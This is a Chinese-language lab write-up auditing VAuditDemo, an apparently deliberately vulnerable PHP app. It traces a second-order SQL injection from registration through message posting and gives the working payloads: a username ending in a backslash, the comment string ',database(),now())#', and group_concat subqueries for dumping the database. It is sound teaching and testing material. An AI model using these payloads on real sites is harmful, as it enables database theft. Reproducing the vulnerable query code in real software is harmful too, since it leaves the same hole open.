[TOC]



# ==VAuditDemo二次注入漏洞==

## 搜索危险函数，用户可控点

除了文件IO，网络IO（file_get_contents(GET)  ||  curl_exec(POST)  ||  fsockopern），数据库CURD

所有代码审计，我们必须假设攻击者具有很强的技能，不能抱有侥幸心理，就和密码学中的模型一样，假设攻击者的能力如何如何等等

所以我在这里解释一下，为什么选择下面几个页面并溯源和分析出漏洞。因为下面几个页面中所使用的参数都是用户可控的，所以才怀疑这里有漏洞

```
addslashes()
addslashes() 函数在指定的字符串中为以下预定义字符添加反斜杠：

单引号 (')
双引号 (")
反斜杠 (\)
NULL 字符（\0）
这个函数主要用于转义字符串数据，使其能够在诸如数据库查询、文件路径、cookie 存储等场合中安全地使用。然而，需要注意的是，addslashes() 并不总是足够安全地防止 SQL 注入，因为它不会考虑数据库连接的具体字符集和引号样式（如 SQL 语句中的标识符是否可能由反引号包围）。

mysql_real_escape_string()
mysql_real_escape_string() 函数是专门用于转义 SQL 语句中的字符串，以避免 SQL 注入攻击的。它根据当前活动的 MySQL 连接所使用的字符集对字符串中的特殊字符进行转义。这意味着它会转义那些在 SQL 语句中有特殊意义的字符，如：

单引号 (')
双引号 (")（尽管在大多数情况下，SQL 语句中的字符串被单引号包围）
反斜杠 (\)（在 MySQL 中用于转义特殊字符）
NULL 字符（\0）在某些情况下可能需要处理，但主要是单引号和反斜杠
重要的是，mysql_real_escape_string() 还会考虑当前 MySQL 连接使用的 SQL 模式（例如，是否允许 NO_BACKSLASH_ESCAPES），从而更准确地转义字符串。
```



### regCheck.php

```sql
$clean_name = clean_input($_POST['user']);
$clean_pass = clean_input($_POST['passwd']);
$avatar = '../images/default.jpg';
$date = date('Y-m-d');
INSERT INTO users(user_name,user_pass,user_avatar,join_date) VALUES ('$clean_name',SHA('$clean_pass'),'$avatar','$date')

$_SESSION['username'] = $clean_name;
```

该页面中的SQL语句是无法形成SQL注入漏洞的，因为`$clean_name`是经过 `sec($_POST)` 以及 clean_input 两个函数过滤的，然后 `SHA('$clean_pass')` 是经过哈希处理的一段哈希值，更没指望， `$avatar` 又是写死的，所以单独这个页面不存在什么问题

### messageSub.php

```php
$clean_message = clean_input($_POST['message']);
```

```sql
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('{$_SESSION['username']}','$clean_message',now())
```

经过上方源代码的分析我们可以知道，`$_SESSION['username']` 就是 `$clean_name` ，并且我们知道SQL语句中完全可以不出现特殊字符，比如 `select group_concat(user_name,user_passwd) from users` 或 `database() `没有引号等特殊字符，不符合转移条件，那么这句话就可以原封不动的作为 `$clean_message` 插入数据库，如果此时 `$_SESSION['username']` 碰巧构造出可以转义绕过引号的方式，那么 `$clean_message` 就是我们的payload，结合下面的文件源代码

### message.php

```php
<?php
    
$query = "SELECT * FROM comment ORDER BY comment_id";
$data = mysql_query($query, $conn) or die('Error!!');
mysql_close($conn);
    
while($com = mysql_fetch_array($data)) {
	$html['username'] = htmlspecialchars($com['user_name']);
	$html['comment_text'] = htmlspecialchars($com['comment_text']);
	
	echo '<tr>';
	echo '<td>'.$html['username'].'</td>';
	echo '<td><a href="messageDetail.php?id='.$com['comment_id'].'">'.$html['comment_text'].'</td></a>';
	echo '</tr>';
}
?>
```

一旦messageSub.php可以将 `database()` 这类似的语句作为 `$clean_message` 插入数据库，那么 message.php 页面从数据库中取出数据并执行 SELECT SQL语句时，就可以执行 `$clean_message` 从而将payload的结果输出在页面上，实现爆库，爆表等操作，最终实现拖库

### 漏洞调用链

- 用户注册时，通过对用户名中特殊字符的转义绕过，注册成功
- 之后在messageSub页面中提交构造的message，再结合利用构造的用户名，绕过messageSub中的INSERT SQL语句，
- 将可以执行的SQL代码作为meassage注入到数据库中，
- 然后再利用message.php页面的执行SQL语句来查询数据库中的内容然后展现到前端，从而实现SQL语句注入绕过。

## 漏洞错误利用过程

漏洞原理分析好了之后，此时可以先尝试构造payload ，等payload构造出来了之后就正式开始利用

```
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('{$_SESSION['username']}','$clean_message',now())

INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',','database()',now())  -- 这样肯定不行，单引号里的都是字符串

INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\','database()',now())

INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',',database(),now()',now())  -- 此时user_name=xxxx\',   comment_text=database()    pub_date=

INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',',database(),now())#',now())

paylaod: xxxx\',       ,database(),now())#
```

### 注册用户 ` xxxx',`

因为程序将数据在执行INSERT SQL语句时会进行特殊字符转义，此时不会出现漏洞，而数据库中存储内容时，又会将转义符去掉，但是将数据从数据库中取出的时候又会进行转义（messade.php），所以展现在页面上依旧是被转义过后的

![image-20240821184919661](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821184919661.png)

![image-20240821184757429](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821184757429.png)

![image-20240821184733270](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821184733270.png)

如果此时退出再进行登录，可以发现用这个用户登录时，竟然出现错误，并且发现登录的用户名竟然成了 xxxx',

![image-20240821185450780](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821185450780.png)

> 讲一下为什么登录Error，但是依旧该页面user.php登录成功，但是用户却不是之前的用户
>
> <img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821190630621.png" alt="image-20240821190630621" style="zoom:150%;" />
>
> 如果你要插入的字符串是 `xxxx'`，你在 SQL 语句中应该写成 `xxxx\'`。数据库在解析 SQL 语句时，会将 `\'` 解释为一个普通的单引号，而不是字符串的结束符。
>
> - 注册 regCheck.php
>
>   ```php
>   $_SESSION['username'] = $clean_name;  //此时会将 $_SESSION['username'] 赋值为 xxxx\',
>   ```
>
> - 登录 logCheck.php
>
>   ```php
>   $query = "SELECT * FROM users WHERE user_name = '$clean_name' AND user_pass = SHA('$clean_pass')";
>   
>   $query = "SELECT * FROM users WHERE user_name = 'xxxx\',' AND user_pass = SHA('$clean_pass')";
>   
>   $data = mysql_query($query, $conn) or die('Error!!');
>   
>   if (mysql_num_rows($data) == 1) {
>       $row = mysql_fetch_array($data);
>       $_SESSION['username'] = $row['user_name'];
>       $_SESSION['avatar'] = $row['user_avatar'];
>       $ip = sqlwaf(get_client_ip());
>       $query = "UPDATE users SET login_ip = '$ip' WHERE user_id = '$row[user_id]'";
>       mysql_query($query, $conn) or die("updata error!");
>       header('Location: user.php');
>   }
>   ```
>
>   该页面数据库语句将会执行成功，然后跳转到 user.php 页面，但是从数据库中取出来的用户名还没有及逆行转义就立马赋值给了 `$_SESSION['username']` ，导致下面出现的漏洞
>
> - 页面显示 user.php
>
>   ```php
>   <?php
>   	$query = "SELECT * FROM users WHERE user_name = '{$_SESSION['username']}'";
>   	// die($_SESSION['username']);   // xxxx',
>   	$data = mysql_query( $query, $conn ) or die( 'Error!!' );
>   ?>
>       
>   <div style="float:left;">
>       <img src="avatar.php" width="100" height="100" class="img-thumbnail" >
>       <div class="text-center"><?php echo $_SESSION['username']?></div>
>   </div>
>   ```
>
>   此时就会弹出Error，因为 通过 die() 函数的调试发现`$_SESSION['username']` 的值竟然是 `xxxx',` 在执行SQL语句时，由于单引号闭合的问题，就会导致SQL语句执行错误。，于是结束代码，但是结束的仅仅是php代码，下面的<div>标签中输出正是页面所显示的
>
> - 用该用户发表留言试试
>
>   ![image-20240821192534830](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821192534830.png)
>
>   好吧，这确实是失败了
>
> - 所以这也是一个小小的漏洞点，也许在其他的地方，根据此次的 `$_SESSION['username']` 还会造成问题，还需深入审计

**所以需要注意，一旦注册成功这样的用户之后，就不要再退出了，直接去发表留言**

### 发表payload留言

![image-20240821193230931](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821193230931.png)

失败了，为什么

我们进入数据库去看看咋回事

![image-20240821193732307](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821193732307.png)

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821193719231.png" alt="image-20240821193719231" style="zoom:150%;" />

navicat中执行没毛病啊wk，数据库也确实成功插入了

对代码进行调试

regCheck.php

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821195343150.png" alt="image-20240821195343150" style="zoom:150%;" />

message.php

![image-20240821195414871](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821195414871.png)

messageSub.php

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821195515651.png" alt="image-20240821195515651" style="zoom:150%;" />

ok，确实SESSION变量中的内容都是我们所预期的，但是没想到最终问题出现在了提交的内容里面，竟然被转义了，那如果使用无法被转义的payload `,database(),now()` 构造的sql如下

```sql
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',',database(),now())#',now())
```

分析着完全没毛病啊，使用代码调试一下

![image-20240821200140977](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821200140977.png)

也没有被转义，而且navicat也运行成功了

![image-20240821200304751](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821200304751.png)

这到底怎么回事呢？

## 漏洞正确利用过程

**从最开始的SQL语句 直接到 替换payload后的SQL语句就可以看出问题所在**wwww'

```sql
SQL语句
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx','database()',now())
目的要让 ('xxxx','database()',now()) 中的 'xxxx','中的 ', 失效，以便于'database()这个前面的引号与'xxxx这个前面的引号闭合，最后注释最后的引号，让database()单独出来
用户名为xxxx',时
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',',',database(),now())#',now())
用户名为wwww\时
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('wwww\\',',database(),now())#',now())


错误payload  xxxx\',       ,database(),now())#
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',',',database(),now())#',now())

正确payload  xxxx\         ,database(),now())#
此时用户名准确的说错误的，请往下看
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxxx\',',database(),now())#',now())
```

注册时，用户名是转义之后存放在 `$_SESSION['username']` 中，此时数据库中存储的是去掉转义符的，而登录时直接从数据库中的内容取出来存放在 `$_SESSION['username']` 中，此时，用户名存在特殊字符

上面错误的情况构造的payload最终结果与正确时生成的payload完全一样，但为什么上面是错的，下面就是对的？

**别忘了，程序中SQL的产生，是将POST中的参数过滤后直接替换掉`$query` 中的参数，程序的SQL语句可不是构造出来的，而是替换出来的**

```sql
错误的情况，仔细看，会发现因为我注册的用户是 xxxx', 所以我不禁多添加了一个单引号，还多添加了一个,逗号
仔细看正确的情况和错误的情况会发现，引号确实是问题所在，难怪使用这个用户名一直都不成功，虽然payload是一样的，在自己构造的语句中，看似很正确，实则是错误的
而正确的情况中，将payload直接替换进原始SQL后，引号也没有产生问题。我们要做的就是针对$clean_message这个变量两边的引号，前面的引号与更前面的引号闭合，后面的引号直接注释，不能让引号还作用在语句中
```

### 注册用户 wwww\

注册时在用户名处输入 wwww\，因为会对自己输入的 \ 再进行转义，导致他成为合法的用户名

![image-20240821220924650](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821220924650.png)

![image-20240821215901847](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821215901847.png)

![image-20240821220738582](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821220738582.png)

如果此时发表留言，sql语句会如下

```sql
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('wwww\\',',database(),now())#',now())
```

而登录时，直接从数据库中取数据赋值，不做过滤处理

![image-20240821221018331](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821221018331.png)

![image-20240821220954749](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821220954749.png)

所以，现在退出 `wwww\\` 用户 登录 wwww\ 

### 退出用户 `wwww\\` 使用 wwww\ 登录

这个问题，在上面的 灰色内容中 解释过了

![image-20240821221149381](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821221149381.png)

代码调试

![image-20240821221328830](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821221328830.png)

终于得到了我们想要的内容

### 发表留言

`,database(),now())# ` 终于成功了

![image-20240821221516011](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240821221516011.png)

## 替换database()字段

接下来替换该字段为 user() ,(select group_concat(column_name) from user() where table_schema=database()) 子查询语句即可，最终实现爆库，子查询语句中需要替换user() 和 database() 等字段
